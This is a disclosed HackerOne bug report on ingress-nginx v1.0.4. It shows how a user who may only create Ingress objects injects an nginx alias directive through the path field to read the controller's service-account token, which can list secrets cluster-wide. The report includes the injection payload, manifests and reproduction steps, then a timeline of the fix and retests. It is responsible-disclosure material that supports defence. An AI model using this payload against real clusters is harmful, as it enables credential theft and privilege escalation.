---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/privilege-escalation
  - env/cloud
  - stack/kubernetes
  - stack/nginx
substate: "resolved"
weakness: "Privilege Escalation"
enriched: true
body: true
date: 2022-08-06
submitted: 2021-10-27T10:37:06.918Z
bounty_usd: 2500
votes: 18
cve: []
program: "[[programs/kubernetes|Kubernetes]]"
reporter: "0ria"
source: "https://hackerone.com/reports/1382919"
title: "Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token"
---
# Ingress-nginx path allows retrieval of ingress-nginx serviceaccount token

> **Severity:** High | **Bounty:** 2,500 USD | **Votes:** 18 | **Program:** Kubernetes | **Disclosed:** 2022-08-06

- Report: [https://hackerone.com/reports/1382919](https://hackerone.com/reports/1382919)
- CWE: Privilege Escalation
- Submitted: 2021-10-27T10:37:06.918Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Report Submission Form

## Summary:
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

## Kubernetes Version:
1.20 (should work on (1.21 as well)

## Component Version:
nginx ingress controller v1.0.4

## Steps To Reproduce:
I deployed the latest ingress-controller (v1.0.4).
I used a user (gaf_test) that has the permissions to get, create and update ingress resources
(the “get” permissions is only to allow kubectl to view the newly created resource).

ingress-creator-role.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-creator
  namespace: default
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses"]
  verbs: ["get", "create", "update"]
```

ingress-creator-role-binding.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: gaf_test-ingress-creator-binding
  namespace: default
subjects:
- kind: User
  name: gaf_test
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: ingress-creator
  apiGroup: rbac.authorization.k8s.io
```

This user (gaf_user) cannot list secrets at all.
{F1495367}
 
Use this user (gaf_user) to create a new ingress resource in the default namespace.

ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: gaf-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  -  http:
      paths:
        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
          pathType: Prefix
          backend:
            service:
              name: some-service
              port:
                number: 5678
```
```
kubectl apply -f ingress.yaml
```
{F1495369}
 

Access to nginx ingress loadbalancer to /gaf/token path.

https://<host>/gaf/token

 {F1495370}

Decode the token to see it belongs to the ingress-nginx
{F1495372}
 
The nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.

## The Root Cause
When a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.
I caused a “config file injection” using the following payload as path:

**/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa**
The payload above creates the following configuration for nginx:

/etc/nginx/nginx.conf

{F1495371} 

This is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
that maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.

## Impact

A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

## Timeline

- **Report Filed**
- **2021-10-27** @0ria: I submitted this vulnerability to security@kubernetes.io on Sunday, 24 October 2021.
An email I received back requested to mention it in this report so it will not be marked as a duplicate.
- **2021-10-31** @h1_analyst_oliver: Hi @gaffy,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@princeofpersia
- **Report Needs More Info**
- **Report New**
- **2021-11-04** @0ria: Hi @princeofpersia, 

Are the commands OK? Is there something missing?
- **Report Triaged**
- **Report Triaged**
- **Bounty Awarded**
- **2021-12-23** @cjcullen: @gaffy How would you like to be credited (if at all) in the CVE?
- **2021-12-23** @0ria: Thanks for the bounty reward!
Regarding the CVE, my name is Gafnit Amiga.

I'm really curious about the fix. Is it possible to share some details about it? Thanks
- **2022-02-24** @0ria: Hi @cjcullen, 
Is there any update about the fix or an estimated timeline?
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Triaged**
- **2022-05-23** @cjcullen: Thanks for the retest. I'm waiting for the maintainer to repro and propose a fix, but I went ahead and checked the regexes [here](https://github.com/kubernetes/ingress-nginx/blob/main/internal/ingress/inspector/rules.go#L25-L29) and confirmed that they would get tripped up by strings with newlines. Was there anything else missing that you noticed?
- **2022-05-24** @0ria: No. If newlines will be handled the regex will match it. I also think it will be better to harden the /var/run/secrets regex, because there are many options for paths such as /run/secrets and usage of /./ /../
- **2022-06-02** @cjcullen: Oh yeah, good point. I'll pass that on to the maintainers for a follow-on fix. If the `alias` directive is blocked, is there any other way to get to /var/run/secrets that you can think of?
- **Report Retesting**
- **2022-06-04** @0ria: Hi @cjcullen,

Retested in v1.2.1.
PR [#8623](https://github.com/kubernetes/ingress-nginx/pull/8623) does improve the regex and catches new lines.
PR [#8624](https://github.com/kubernetes/ingress-nginx/pull/8624) successfully removes the alias and root directives.
- **Retest User Expired**
- **External User Joined**
- **User Completed Retest**
- **External User Removed**
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
